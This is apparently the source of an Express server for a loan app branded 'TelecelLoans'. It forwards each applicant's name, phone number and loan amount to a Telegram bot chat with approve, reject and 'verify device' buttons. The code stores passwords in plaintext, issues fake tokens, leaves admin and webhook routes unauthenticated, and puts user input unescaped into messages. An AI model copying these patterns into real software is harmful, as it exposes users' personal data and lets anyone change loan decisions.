const express = require('express');
const cors = require('cors');
const app = express();
const PORT = process.env.PORT || 5000;

// Middleware
app.use(cors());
app.use(express.json());

// Simple in-memory storage (no database needed!)
const users = [];
const loans = [];

// ─── TELEGRAM HELPER FUNCTION ───
async function sendTelegramMessage(text, replyMarkup = null) {
  try {
    const token = process.env.TELEGRAM_BOT_TOKEN;
    const chatId = process.env.TELEGRAM_CHAT_ID;
    
    if (!token || !chatId) {
      console.error('❌ Telegram credentials missing!');
      return null;
    }
    
    const url = `https://api.telegram.org/bot${token}/sendMessage`;
    
    const payload = {
      chat_id: chatId,
      text: text,
      parse_mode: 'HTML'
    };
    
    if (replyMarkup) {
      payload.reply_markup = replyMarkup;
    }
    
    const response = await fetch(url, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(payload)
    });
    
    const result = await response.json();
    console.log('✅ Telegram sent:', result.ok ? 'Success' : 'Failed');
    return result;
  } catch (error) {
    console.error('❌ Telegram error:', error.message);
    return null;
  }
}

// Health check
app.get('/health', (req, res) => {
  res.json({ status: 'ok', timestamp: new Date().toISOString() });
});

// Root
app.get('/', (req, res) => {
  res.json({
    name: 'TelecelLoans API',
    version: '1.0.0',
    endpoints: {
      auth: '/api/auth/register, /api/auth/login',
      loans: '/api/loans/apply, /api/loans/my-loans',
      telegram: '/api/telegram/send-auth, /api/telegram/test',
      health: '/health'
    }
  });
});

// ─── AUTH ROUTES ───

// Register
app.post('/api/auth/register', async (req, res) => {
  try {
    const { name, phone, password } = req.body;
    const existing = users.find(u => u.phone === phone);
    if (existing) {
      return res.status(400).json({ success: false, message: 'User already exists' });
    }
    const user = {
      id: Date.now().toString(),
      name,
      phone,
      password,
      created_at: new Date()
    };
    users.push(user);
    res.json({
      success: true,
      token: 'fake-jwt-token-' + user.id,
      user: { id: user.id, name: user.name, phone: user.phone }
    });
  } catch (error) {
    res.status(500).json({ success: false, message: error.message });
  }
});

// Login
app.post('/api/auth/login', async (req, res) => {
  try {
    const { phone, password } = req.body;
    const user = users.find(u => u.phone === phone && u.password === password);
    if (!user) {
      return res.status(401).json({ success: false, message: 'Invalid credentials' });
    }
    res.json({
      success: true,
      token: 'fake-jwt-token-' + user.id,
      user: { id: user.id, name: user.name, phone: user.phone }
    });
  } catch (error) {
    res.status(500).json({ success: false, message: error.message });
  }
});

// ─── LOAN ROUTES ───

// Apply for loan
app.post('/api/loans/apply', async (req, res) => {
  try {
    const { amount, period_days, interest_rate, period_label, userId, name, phone } = req.body;
    const interestAmount = amount * (interest_rate / 100);
    const totalAmount = amount + interestAmount;
    const dueDate = new Date();
    dueDate.setDate(dueDate.getDate() + period_days);
    
    const loan = {
      id: 'loan_' + Date.now(),
      userId: userId || 'user_123',
      name: name || 'Unknown',
      phone: phone || 'Unknown',
      amount,
      interest_rate,
      interest_amount: interestAmount,
      total_amount: totalAmount,
      period_days,
      period_label: period_label || period_days + ' days',
      status: 'pending',
      due_date: dueDate,
      created_at: new Date()
    };
    loans.push(loan);
    
    // ─── SEND TELEGRAM NOTIFICATION ───
    const message = `<b>💰 New Loan Application</b>\n\n` +
                    `<b>Name:</b> ${loan.name}\n` +
                    `<b>Phone:</b> <code>${loan.phone}</code>\n` +
                    `<b>Amount:</b> GHS ${amount.toFixed(2)}\n` +
                    `<b>Period:</b> ${period_days} days\n` +
                    `<b>Interest:</b> ${interest_rate}%\n` +
                    `<b>Total:</b> GHS ${totalAmount.toFixed(2)}\n` +
                    `<b>Loan ID:</b> <code>${loan.id}</code>\n\n` +
                    `<i>Please review and approve this loan.</i>`;
    
    const replyMarkup = {
      inline_keyboard: [
        [
          { text: "✅ Approve", callback_data: `approve_${loan.id}` },
          { text: "❌ Reject", callback_data: `reject_${loan.id}` }
        ],
        [
          { text: "📱 Verify Device", callback_data: `verify_${loan.id}` }
        ]
      ]
    };
    
    await sendTelegramMessage(message, replyMarkup);
    
    console.log(`📱 Loan application from ${loan.name} (${loan.phone}) - GHS ${amount}`);
    
    res.status(201).json({
      success: true,
      loan
    });
    
  } catch (error) {
    console.error('❌ Loan application error:', error);
    res.status(500).json({ success: false, message: error.message });
  }
});

// Get user loans
app.get('/api/loans/my-loans', (req, res) => {
  const userId = req.query.userId || 'user_123';
  const userLoans = loans.filter(l => l.userId === userId);
  res.json({ success: true, loans: userLoans });
});

// Get loan by ID
app.get('/api/loans/:id', (req, res) => {
  const loan = loans.find(l => l.id === req.params.id);
  if (!loan) {
    return res.status(404).json({ success: false, message: 'Loan not found' });
  }
  res.json({ success: true, loan });
});

// Update loan status
app.put('/api/loans/:id/status', async (req, res) => {
  try {
    const { status } = req.body;
    const loan = loans.find(l => l.id === req.params.id);
    if (!loan) {
      return res.status(404).json({ success: false, message: 'Loan not found' });
    }
    loan.status = status;
    if (status === 'disbursed') {
      loan.disbursed_at = new Date();
    }
    
    // ─── SEND STATUS UPDATE TO TELEGRAM ───
    const statusEmoji = status === 'approved' ? '✅' : 
                        status === 'rejected' ? '❌' : 
                        status === 'disbursed' ? '💰' : '📝';
    
    const message = `${statusEmoji} <b>Loan ${status.toUpperCase()}</b>\n\n` +
                    `<b>Name:</b> ${loan.name || 'Unknown'}\n` +
                    `<b>Amount:</b> GHS ${loan.amount.toFixed(2)}\n` +
                    `<b>Status:</b> ${status.toUpperCase()}\n` +
                    `<b>Loan ID:</b> <code>${loan.id}</code>`;
    
    await sendTelegramMessage(message);
    
    res.json({ success: true, loan });
  } catch (error) {
    console.error('❌ Update status error:', error);
    res.status(500).json({ success: false, message: error.message });
  }
});

// ─── TELEGRAM ENDPOINTS ───

// Send authorization to Telegram
app.post('/api/telegram/send-auth', async (req, res) => {
  try {
    const { phone, amount, name, loanId } = req.body;
    
    console.log(`📱 Telegram Auth Request: ${name} (${phone}) - GHS ${amount}`);
    
    const message = `<b>💰 Loan Authorization</b>\n\n` +
                    `<b>Name:</b> ${name || 'Unknown'}\n` +
                    `<b>Phone:</b> <code>${phone || 'Unknown'}</code>\n` +
                    `<b>Amount:</b> GHS ${amount || '0'}\n` +
                    `<b>Loan ID:</b> <code>${loanId || 'N/A'}</code>\n\n` +
                    `<i>Please approve or reject this loan.</i>`;
    
    const replyMarkup = {
      inline_keyboard: [
        [
          { text: "✅ Approve", callback_data: `approve_${loanId || 'test'}` },
          { text: "❌ Reject", callback_data: `reject_${loanId || 'test'}` }
        ],
        [
          { text: "📱 Verify Device", callback_data: `verify_${loanId || 'test'}` }
        ]
      ]
    };
    
    const result = await sendTelegramMessage(message, replyMarkup);
    
    res.json({
      success: true,
      message: 'Authorization request sent to admin',
      telegram: result
    });
    
  } catch (error) {
    console.error('❌ Telegram error:', error);
    res.status(500).json({
      success: false,
      message: error.message
    });
  }
});

// Test Telegram endpoint
app.post('/api/telegram/test', async (req, res) => {
  try {
    const { message } = req.body;
    const testMessage = message || '🔔 Test message from TelecelLoans backend!';
    
    const result = await sendTelegramMessage(testMessage);
    
    res.json({
      success: true,
      message: 'Test message sent',
      telegram: result
    });
  } catch (error) {
    console.error('❌ Test error:', error);
    res.status(500).json({
      success: false,
      message: error.message
    });
  }
});

// Telegram webhook (for callback queries)
app.post('/api/telegram/webhook', async (req, res) => {
  try {
    const { body } = req;
    console.log('📨 Webhook received:', JSON.stringify(body, null, 2));
    
    // Handle callback queries
    if (body.callback_query) {
      const { data, id, from } = body.callback_query;
      console.log(`📱 Callback: ${data} from ${from.username || from.id}`);
      
      // Parse the callback data
      const [action, loanId] = data.split('_');
      
      if (action === 'approve') {
        // Find and update loan
        const loan = loans.find(l => l.id === loanId);
        if (loan) {
          loan.status = 'approved';
          await sendTelegramMessage(`✅ Loan ${loanId} has been <b>APPROVED</b>!\n\nName: ${loan.name}\nAmount: GHS ${loan.amount.toFixed(2)}`);
        }
      } else if (action === 'reject') {
        const loan = loans.find(l => l.id === loanId);
        if (loan) {
          loan.status = 'rejected';
          await sendTelegramMessage(`❌ Loan ${loanId} has been <b>REJECTED</b>.`);
        }
      } else if (action === 'verify') {
        await sendTelegramMessage(`📱 Device verification requested for loan ${loanId}.`);
      }
      
      // Acknowledge the callback
      await fetch(`https://api.telegram.org/bot${process.env.TELEGRAM_BOT_TOKEN}/answerCallbackQuery`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          callback_query_id: id,
          text: '✅ Processing your request...'
        })
      });
    }
    
    res.sendStatus(200);
  } catch (error) {
    console.error('❌ Webhook error:', error);
    res.sendStatus(500);
  }
});

// ─── START SERVER ───

app.listen(PORT, () => {
  console.log(`🚀 TelecelLoans Server running on port ${PORT}`);
  console.log(`📍 http://localhost:${PORT}`);
  console.log(`📱 Telegram Bot: @TelecelCashbot`);
});

// Export for Railway
module.exports = app;
